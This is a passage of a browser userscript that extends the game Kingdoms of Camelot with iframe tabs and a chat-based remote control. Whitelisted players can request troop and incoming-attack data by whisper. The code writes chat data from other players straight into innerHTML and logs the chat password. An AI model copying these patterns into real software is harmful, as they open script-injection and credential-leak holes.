    t.myDiv.innerHTML = '<DIV class=pdxStat>'+culang.HchatTab+'</div><TABLE class=pdxTab><TR>						<TD><input type=checkbox id=pbchatqaenable /></td><TD>'+culang.CTenable+'</td></tr>						<TR><TD><input type=checkbox id=pbautoblacklist /></td>						<TD>'+culang.CTusrblack+' <b>(<span class=boldRed>'+culang.CTwrongpw+'</span>)</b></td>						</tr><TR><TD><input type=checkbox id=pbchatpassenable /></td><TD>'+culang.CTusepw+': <input type=text id=pbchatpass value="'+ ChatOptions.password +'"/></td>						</tr><TR><TD></td><TD valign=top><b>'+culang.CTallow+'</b>: <br><textarea cols=30 rows=1 id=allowUserBox></textarea></td></tr>						<TR><TD></td><TD valign=top><b>'+culang.CTplyblack+'</b><br><textarea cols=30 rows=1 id=blacklistUserBox ></textarea></td></tr>						<TR><TD colspan=2><b>'+culang.impnote+'</b>: '+culang.CTimpNote+'</td></tr></table>';

	t.togtext('allowUserBox', 'AllowUsersRemoteControl');	t.togtext('blacklistUserBox', 'BlacklistUsersRemoteControl');	t.togOpt('pbautoblacklist', 'Chatautoblacklist');	t.togOpt('pbchatqaenable', 'Chatenable', ChatStuff.init);	t.togOpt('pbchatpassenable', 'Chatpassenable');
	document.getElementById('pbchatpass').addEventListener('change', function(e){
		ChatOptions.password = e.target.value;
		GM_log(e.target.value);
		saveChatOptions();
	}, false);
  },
  
  togtext : function(boxId, optionName){
    var t = Tabs.Chat;
	var e = document.getElementById(boxId);
	var text = '';
	for(i=0; i<ChatOptions[optionName].length; i++)
		text += ChatOptions[optionName][i]+'\n';
	e.value = text;
	e.addEventListener('change', new eventToggle(boxId, optionName).handler, false);
	function eventToggle (boxId, optionName){
      this.handler = handler;
      var optName = optionName;
      function handler(event){
	    ChatOptions[optionName] = [];
		var values = this.value.split('\n');
        for(var i=0; i<values.length; i++)
			ChatOptions[optionName][i] = values[i];
        saveChatOptions();
      }
    }
  },
  
  togOpt : function (checkboxId, optionName, callEnable, callIsAvailable){
    var t = Tabs.Chat;
    var checkbox = document.getElementById(checkboxId);
    
    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (ChatOptions[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', new eventToggle(checkboxId, optionName, callEnable).handler, false);
    function eventToggle (checkboxId, optionName, callOnChange){
      this.handler = handler;
      var optName = optionName;
      var callback = callOnChange;
      function handler(event){
        ChatOptions[optionName] = this.checked;
        saveOptions();
        if (callback != null)
          callback (this.checked);
      }
    }
  },
  
  viewtroops : function (u1,u2,u3,u4,u5,u6,u7,u8,u9,u10,u11,u12){
	var t = Tabs.Chat;
  	t.popReport = new CPopup('pbShowTroops', 0, 0, 746, 100, true);
  	t.popReport.centerMe (mainPop.getMainDiv());  
  	var m = '<DIV style="max-height:475px; overflow:auto">'; 
  	
  	m+='<TABLE class=pdxTab>\
		<TR><TD><b>'+culang.CTattacks+'</b></td></tr></table>';
	m+='<TABLE class=pdxTab><TR><TD align="center">'+culang.troops+'</td><TD align="center">'+culang.amount+'</td></tr>';
	
	if(u1) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg></td><TD align="center">'+parseInt(u1)+'</td></tr>';
	if(u2) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg></td><TD align="center">'+parseInt(u2)+'</td></tr>';
	if(u3) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg></td><TD align="center">'+parseInt(u3)+'</td></tr>';
	if(u4) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg></td><TD align="center">'+parseInt(u4)+'</td></tr>';
	if(u5) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg></td><TD align="center">'+parseInt(u5)+'</td></tr>';
	if(u6) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg></td><TD align="center">'+parseInt(u6)+'</td></tr>';
	if(u7) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg></td><TD align="center">'+parseInt(u7)+'</td></tr>';
	if(u8) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg></td><TD align="center">'+parseInt(u8)+'</td></tr>';
	if(u9) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg></td><TD align="center">'+parseInt(u9)+'</td></tr>';
	if(u10) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg></td><TD align="center">'+parseInt(u10)+'</td></tr>';
	if(u11) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg></td><TD align="center">'+parseInt(u11)+'</td></tr>';
	if(u12) m+='<TR><TD align="center"><img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg></td><TD align="center">'+parseInt(u12)+'</td></tr>';
	
  	m+='<TR><TD></TD></TR><TR><TD></TD></TR></table>';
	
	m+='</div>';
  	t.popReport.getMainDiv().innerHTML = m;
  	t.popReport.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B>'+culang.CTincattcks+'</b></center></div>';
  	t.popReport.show(true)	;
  },
  
  hide : function (){
    var t = Tabs.Chat;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  
  show : function (){
    var t = Tabs.Chat;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

}

var ChatStuff = {
timeout : null,
processqueue : [],
latestChats : [],

  init:function() {
	var t=ChatStuff;
	var comm=document.getElementById('mod_comm_list2');
	if(comm && ChatOptions.Chatenable) {
		if(t.timeout == null) {
			t.GetLatestChat();
			t.timeout = window.setTimeout(function() {
				t.IterateChat(t.ChatAdded);
			},200);
		} else {
			logit("Maybe too many chat messages, chat already processing.");
		}
	}
	window.setTimeout(function() {
		t.init();
	},5000);
  },

  GetLatestChatStr:function(chatObj) { 
	return chatObj.name+'#'+chatObj.time+'#'+chatObj.text.split(/[\.\?]/)[0]; 
  },

  GetLatestChat:function() {
	var t = ChatStuff;
	t.latestChats = ChatOptions.latestChats;
	if(t.latestChats.length>25) {
		t.latestChats.splice(0,1);
	}
  },

  GetChatTimeNum:function(time) {
	var tarr=time.split(':');
	if(!time) return undefined;
	var timeNum=(tarr[0]*60)+tarr[1];
	return timeNum;
  },

  GetChatObj:function(htmlObj) {
	var t=ChatStuff;
	var nm=searchDOM(htmlObj,'node.className=="nm"',8);
	var time=searchDOM(htmlObj,'node.className=="time"',8);
	var tx=searchDOM(htmlObj,'node.className=="tx"',8);
	if(!nm || !time || !tx) { return undefined; }
	var nameArr=nm.innerHTML.split(' ');
	var fromMe = nameArr[1]==Seed.player.name?true:false;
	return { 
		'obj':htmlObj,
		'textObj':tx,
		'name':nm.innerHTML,
		'time':time.innerHTML,
		'text':tx.innerHTML,
		'shortName':nameArr[1],
		'timeNum':t.GetChatTimeNum(time.innerHTML),
		'fromMe':fromMe?1:0,
	};
  },
  IterateChat:function(func) {
	var t=ChatStuff;
	var comm = document.getElementById('mod_comm_list2');
	var directs = searchDOM(comm,'node.className=="chatwrap clearfix direct"',4,true);
	var chats=[];
	for(var d=directs.length-1; d>=0; d--) {
		var direct=directs[d];
		var chatObj=t.GetChatObj(direct);
		if(chatObj) {
			chats.push([direct,chatObj]);
		}
	}
	t.checkProcessed(chats, func);
  },

  checkProcessed : function(chats, func){
	var t=ChatStuff;
	for(var c=0; c<chats.length; c++) {
		var found = false;
		var chatObj=chats[c][1];
		for(var i=0; i<t.latestChats.length; i++){
			if(t.latestChats[i] == t.GetLatestChatStr(chatObj))
				found = true;
		}
		if(!found){
		chatObj.notProcessed=true;
		ChatOptions.latestChats.push(t.GetLatestChatStr(chatObj));
		}
		func(chatObj);
	}
	saveChatOptions();
	t.timeout = null;
  },

  GetCitiesHash:function(arr) {
	var h={};
	for(var a=0; a<arr.length; a++) {
		var city=arr[a];
		var newA=[]
		Array.prototype.push.apply(newA, city);

		h[city[0]]=newA;
	}
	return h;
  },

  SendChat:function(name,mess) {
	var inp=document.getElementById('mod_comm_input');
	inp.value="@"+name+' '+mess;
	logit('Send chat:'+mess);
	unsafeWindow.Chat.sendChat();
  },

  ChatFuncs:{
	'troops':{
		'question':function(chatObj,info) {
			if(!chatObj.notProcessed) { return; }
			var t=ChatStuff;
			
			t.SendChat(chatObj.shortName,"troops."+JSON2.stringify({
				'cities':t.GetCitiesHash(Seed.cities),
				'troops':Seed.units,
			}));
		},
		'answer':function(chatObj,info) {
			var t=ChatStuff;
			// {"city24479":{"tick":1297589617,"rec1":"[756220044, 2592000000, 7100, 3033]","rec2":"[539696566, 1836000000, 5000, 0]","rec3":"[191319892, 1548000000, 4200, 0]","rec4":"[4512787, 1512000000, 4100, 0]"}}
			var infoObj=JSON2.parse(info);
			var res=infoObj.troops;
			var cities=infoObj.cities;
			
			chatObj.textObj.innerHTML='';
			var table=document.createElement('table');
			//table.className='direct';
			function AddCell(tr) {
				var td=tr.insertCell(-1);
				//td.className='direct';
				if (Options.chatwhisper) td.style.backgroundColor=''+Colors.WhisperBG+'';
				td.style.textAlign='right';
				return td;
			}
			for(var city in res) {
				var resObj=res[city];
				
				var tr=table.insertRow(-1);
				//var cityTd=tr.insertCell(-1);
				var cityTd=AddCell(tr);
				cityTd.colspan='4';
				cityTd.style.fontWeight='bold';
				var cityM=/([0-9]+)$/.exec(city);
				var cityObj=cities[cityM[1]];
				if(!cityObj) {
					logit('Cannot find city:'+cityM[1]);
					continue; 
				}
				
				cityTd.innerHTML=cityObj[1];
				//for(var r=1; r<=4; r++ ) {
				for(var unt in resObj) {
					//var rarr=JSON2.parse(resObj['rec'+r].replace(' ',''));
					var units=parseInt(resObj[unt]);
					
					if(units<=0) continue;
					var tr=table.insertRow(-1);
					AddCell(tr).innerHTML=unsafeWindow.unitcost[unt][0];
					AddCell(tr).innerHTML=addCommas(units);
				}
			}
			chatObj.textObj.appendChild(table);
		},
	},
	'attacks':{
		'question':function(chatObj,info) {
			if(!chatObj.notProcessed) { return; }
			var t=ChatStuff;
			
			t.SendChat(chatObj.shortName,"attacks."+JSON2.stringify({
				'cities':t.GetCitiesHash(Seed.cities),
				'marches':Seed.queue_atkinc,
				'players':Seed.players,
				'alliance':Seed.allianceNames,
			}));
		},
		'answer':function(chatObj,info) {
			var t=ChatStuff;
			var infoObj=JSON2.parse(info);
			var res=infoObj.marches;
			var cities=infoObj.cities;
			var names=infoObj.players;
			var alliance=infoObj.alliance;
			
			chatObj.textObj.innerHTML='';
			var div = document.createElement('div');
			var table=document.createElement('table');
			div.style.overflow = 'auto';
			function AddCell(tr) {
				var td=tr.insertCell(-1);
				if (Options.chatwhisper) td.style.backgroundColor=''+Colors.WhisperBG+'';
				td.style.textAlign='right';
				return td;
			}
			var cityTr = {};
			for(var city in cities) {				
				cityTr[city]=table.insertRow(-1);
				cityTd=AddCell(cityTr[city]);
				cityTd.colspan='4';
				cityTd.style.fontWeight='bold';
				cityTd.innerHTML=cities[city][1].substring(0,10)+' '+pdxkoordlink(cities[city][2],cities[city][3]);
			}
			for(var marches in res){
				var marchObj = res[marches];
				if(!marchObj.toCityId) continue;
				if(marchObj.marchType == 3 || marchObj.marchType ==4){
					var tr=table.insertRow(cityTr[marchObj.toCityId].rowIndex+1);//Specify which city to insert
					var timeLeft = parseInt(marchObj.arrivalTime-unixTime());
					if(timeLeft < 0) continue;
					
					AddCell(tr).innerHTML = timestr(timeLeft);
					AddCell(tr).innerHTML = pdxkoordlink(marchObj.fromXCoord,marchObj.fromYCoord);
					AddCell(tr).innerHTML = names['u'+marchObj.pid]?names['u'+marchObj.pid].n.substring(0,10):(marchObj.players['u'+marchObj.pid]?marchObj.players['u'+marchObj.pid].n.substring(0,10):''+culang.culang.botStatUndefined+'');
					AddCell(tr).innerHTML = (alliance['a'+marchObj.fromAllianceId]?alliance['a'+marchObj.fromAllianceId].substring(0,10):''+culang.culang.botStatUndefined+'')+' ('+getDiplomacy(marchObj.fromAllianceId)+')';
					var troops = [];
					for(var t = 1; t<13; t++){
						troops.push(parseInt(marchObj.unts['u'+t]));
					}
					AddCell(tr).innerHTML = '<a onclick=pbviewtroops('+ troops.join(',') +')>'+culang.showtrps+'</a>';
				}
			}
			div.appendChild(table);
			chatObj.textObj.appendChild(div);
		},
	}
  },

  allowUsersHash:null,
ChatAdded:function(chatObj) {
	var t=ChatStuff;
	if(chatObj) {
	t.noAllow = ChatOptions.BlacklistUsersRemoteControl;
		t.allowUsersHash = ChatOptions.AllowUsersRemoteControl;
		if(t.allowUsersHash.length==0) { return; }
		if(t.noAllow.length!=0) {
		for(var u=0; u<t.noAllow.length; u++)
		if(t.noAllow[u] == chatObj.shortName){
		return;
		}
		}

		var cArr=/^([^\?\.]+)([\.\?])(.*)$/.exec(chatObj.text);
		if(!cArr) {
			return;
		}
		var cmd=cArr[1];
		
		var question=false;
		if(chatObj.fromMe) {
			chatObj.obj.style.borderBottom='1px solid #0f0';
		}
		if(chatObj.notProcessed) {
			chatObj.obj.style.borderLeft='1px solid #ff0';
		}
		
		var cmdInfo=t.ChatFuncs[cmd];

		if(cArr[2]=='?') {
			question=true;
			if(ChatOptions.Chatpassenable){
				var password=cArr[3];
			}
		} else {
			var info=cArr[3];
		}
		
		if(cmdInfo && !question) {
			// hide unreadable requests that are json
			var shortCmd=(cmd+cArr[2]);

			if(chatObj.textObj.innerHTML!=shortCmd && info.substr(0,1)=='{') {
				chatObj.textObj.innerHTML=shortCmd;
			}
		}
		// if(chatObj.fromMe) {
			// return;
		// }
		var done=0;

		if(cmdInfo) {
			window.setTimeout(function() {
				if(question && chatObj.notProcessed) {
					var permission = false;
					for(var u=0; u<t.allowUsersHash.length; u++)
						if(t.allowUsersHash[u] == chatObj.shortName){
							permission = true;
							break;
						}
					if(ChatOptions.Chatpassenable && password!=ChatOptions.password){
						permission = false;
						//GM_log(password+' '+ChatOptions.password);
					}
					if(permission){
						cmdInfo['question'].call(t,chatObj,info);
					} else {
						chatObj.obj.appendChild(document.createTextNode(""+culang.noperCF+": "+chatObj.shortName));
						t.SendChat(chatObj.shortName,""+culang.noperCF+"");
						if(ChatOptions.Chatautoblacklist){
						ChatOptions.BlacklistUsersRemoteControl.push(chatObj.shortName);
						document.getElementById('blacklistUserBox').value += chatObj.shortName+'\n';
						}
					}
				} else {
					cmdInfo['answer'].call(t,chatObj,info);
				}
			},0);				
		}
	} else {
		logit('Chat object failed');
	}
	return true;
  },
}
/***********************************************************************************/
/************ KOC POWER - TABS PARTNER ********************************************/
/********************************************************************************/
Tabs.xChange = {
  tabOrder : StyleOptions.toxChange,                    // order to place tab in top bar
  tabLabel : culang.xChange,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enablePartner,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.xChange;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.xChange;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.xChange;
    try {
     //t.xChange='http://koc.wikia.com/wiki/Kingdoms_of_Camelot_Wiki';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<DIV class=pdxStat>PARTNER</div>'+culang.Partner1+'<BR><HR>'+culang.becomePatner+'';
 
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ KoC dunno Tab ******************************************************/
/********************************************************************************/
Tabs.kocdunno = {
  tabOrder : StyleOptions.toKoCdunno,                    // order to place tab in top bar
  tabLabel : culang.kocDunno,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enablekocDunno,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.kocdunno;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.kocdunno;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.kocdunno;
  var serverID = getServerId();
    try {
     t.kocdunno='http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id='+getServerId();
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
	t.myDiv.innerHTML = '<table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td style="background:none; border:none;" width="116"><a href="http://koc.dunno.com/index.sjs?f=ListServers2" target="_blank">'+culang.serverlist+'</a></td><td style="background:none; border:none;" width="120"><a href="http://koc.dunno.com/doku/doku.php/mapperscript" target="_blank">'+culang.mapperscr+'</a></td><td style="background:none; border:none;" width="191"><div align="right"><a href="http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id='+serverID+'" target="_blank">'+culang.openinnew+'</a></div></td><td style="background:none; border:none;" width="128"><div align="right"><a href="http://koc.dunno.com/doku/doku.php/instructions" target="_blank">'+culang.helpbutton+'</a></div></td></tr></table><CENTER><iframe src="'+ t.kocdunno +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ Rechner Tab ********************************************************/
/********************************************************************************/
Tabs.Calc = {
  tabOrder : StyleOptions.toCalc,                    // order to place tab in top bar
  tabLabel : culang.Calc,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWSCalc,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.Calc;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.Calc;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.Calc;
    try {
     t.Calc='http://koc.god-like.info/rechner.html';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<CENTER><iframe src="'+ t.Calc +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
    
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ IMO Tab ************************************************************/
/********************************************************************************/
Tabs.Imo = {
  tabOrder : StyleOptions.toImo,                    // order to place tab in top bar
  tabLabel : culang.Imo,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWSImo,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.Imo;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.Imo;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.Imo;
    try {
     t.Imo='https://imo.im/';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<CENTER><iframe src="'+ t.Imo +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
    
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ Userscripts Tab ****************************************************/
/********************************************************************************/
Tabs.Usr = {
  tabOrder : StyleOptions.toUsr,                    // order to place tab in top bar
  tabLabel : culang.Usr,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWSUsr,
  init : function (div){    // called once, upon script startup
    var t = Tabs.Usr;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.Usr;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.Usr;
    try {
     t.Usr='http://userscripts.org/users/297645/scripts';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<CENTER><iframe src="'+ t.Usr +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
    
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ WiKi DE Tab ********************************************************/
/********************************************************************************/
Tabs.WiKide = {
  tabOrder : StyleOptions.toWiKide,                    // order to place tab in top bar
  tabLabel : culang.WiKide,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWSWiKide,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.WiKide;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.WiKide;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.WiKide;
    try {
     t.WiKide='http://www.kingdoms-of-camelot.de';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<CENTER><iframe src="'+ t.WiKide +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
    
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ WiKi EN Tab ********************************************************/
/********************************************************************************/
Tabs.WiKien = {
  tabOrder : StyleOptions.toWiKien,                    // order to place tab in top bar
  tabLabel : culang.WiKien,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWSWiKien,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.WiKien;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.WiKien;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.WiKien;
    try {
     t.WiKien='http://koc.wikia.com/wiki/Kingdoms_of_Camelot_Wiki';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<CENTER><iframe src="'+ t.WiKien +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
    
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ googlecode Projekt Tab *********************************************/
/********************************************************************************/
Tabs.WSUpdater = {
  tabOrder : StyleOptions.toGCode,                    // order to place tab in top bar
  tabLabel : culang.WSUpdater,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWSUpdater,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.WSUpdater;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.WSUpdater;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.WSUpdater;
    try {
     t.WSUpdater='http://koc.god-like.info/update/auto-updater-usage.php';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<CENTER><iframe src="'+ t.WSUpdater +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
    
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ Chat Web  **********************************************************/
/********************************************************************************/
Tabs.WebsitePage = {
  tabOrder : StyleOptions.toWebsitePage,                    // order to place tab in top bar
  tabLabel : StyleOptions.WSTabLab,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWebTab2,
  chatlink :  ''+StyleOptions.WebsitePageURL+'',  
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.WebsitePage;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.WebsitePage;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.WebsitePage;
    try {
     var numdo=unsafeWindow.domainName.substr(unsafeWindow.domainName.length-3);
     t.WebsitePage=''+StyleOptions.WebsitePageURL+'';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    
      t.myDiv.innerHTML = '<CENTER><iframe src="'+ t.WebsitePage +'" width="100%" height="550" name="board_in_a_box"> </iframe> <BR></center>';
	  
	  

	t.myDiv.innerHTML = "<CENTER><table width=100% border=0 cellspacing=0 cellpadding=0>\
	<tr><td width=175></td>\
	<td width=175></td>\
	<td width=185><a href="+StyleOptions.WebsitePageURL+">"+culang.changeto+" "+StyleOptions.WSTabLab+"</a> </td>\
	<td width=203><div align=right><a href="+StyleOptions.WebsitePageURL+" target=_blank>"+culang.openinnew+"</a></div></td>\
	</tr></table><div class=pdxStat>"+StyleOptions.WSTabLab+"</div>\
	<iframe src="+ t.WebsitePage +" width=100% height=550 name=board_in_a_box> </iframe> <BR></center>";	
  },
 }
/***********************************************************************************/
/************ KOC POWER - TABS WEBSITE ********************************************/
/************ Alliance Web  ******************************************************/
/********************************************************************************/
Tabs.AlliancePage = {
  tabOrder : StyleOptions.toAlliancePage,                    // order to place tab in top bar
  tabLabel : StyleOptions.pdxAETabLabel,            // label to show in main window tabs
  myDiv : null,
  timer : null,
  tabDisabled : StyleOptions.enableWebTab,
  chatlink :  ''+StyleOptions.pdxAlliancePage+'',  
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.AlliancePage;
    t.myDiv = div;
    div.innerHTML = "";
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.AlliancePage;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
     t.myDiv.innerHTML ="";
      
  },
  show : function (){         // called whenever this tab is shown
  var t = Tabs.AlliancePage;
    try {
     var numdo=unsafeWindow.domainName.substr(unsafeWindow.domainName.length-3);
     t.AlliancePage=''+StyleOptions.pdxAlliancePage+'';
    } catch(e) {
    
    }
       mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';

	t.myDiv.innerHTML = "<CENTER><table width=100% border=0 cellspacing=0 cellpadding=0>\
	<tr><td width=175></td>\
	<td width=175></td>\
	<td width=185><a href="+StyleOptions.pdxAlliancePage+">"+culang.changeto+" "+StyleOptions.pdxAETabLabel+"</a> </td>\
	<td width=203><div align=right><a href="+StyleOptions.pdxAlliancePage+" target=_blank>"+culang.openinnew+"</a></div></td>\
	</tr></table><div class=pdxStat>"+StyleOptions.pdxAETabLabel+"</div>\
	<iframe src="+ t.AlliancePage +" width=100% height=550 name=board_in_a_box> </iframe> <BR></center>";	
  },
 }
/*********************************************************************************/
/************ KOC POWER - TABS END **********************************************/
/*******************************************************************************/

/**********************************************************************************/
/************ KOC POWER - FUNC ***************************************************/
/********************************************************************************/

// ALLIANCE REPORTS
var AllianceReports = {
  checkPeriod : 300,
  allianceNames : [],
  saveArfunc : uW.allianceReports,

  init : function (){
    t = AllianceReports;
    t.enable (Options.enhanceARpts);
    t.marvFunc = new CalterUwFunc ('modal_alliance_report_view', [['getReportDisplay', 'getReportDisplay_hook2']]);
    t.memListFunc = new CalterUwFunc ('membersInfo', [['commonstr.might','commonstr.might + "</td><td class=colcities>" + g_js_strings.commonstr.cities + "</td><td class=collast>" + g_js_strings.membersInfo.lastonline'],['memberInfo[key].prestige', 'memberInfo[key].prestige+ "</td>");memhtml.push("<td class=colcities>" + memberInfo[key].cities + "</td>");memhtml.push("<td class=collast>" + memberInfo[key].lastLogin']]);
    uW.getReportDisplay_hook2 = t.getReportDisplayHook;
    uW.getmembersInfo_hook = t.getMembersInfoHook;
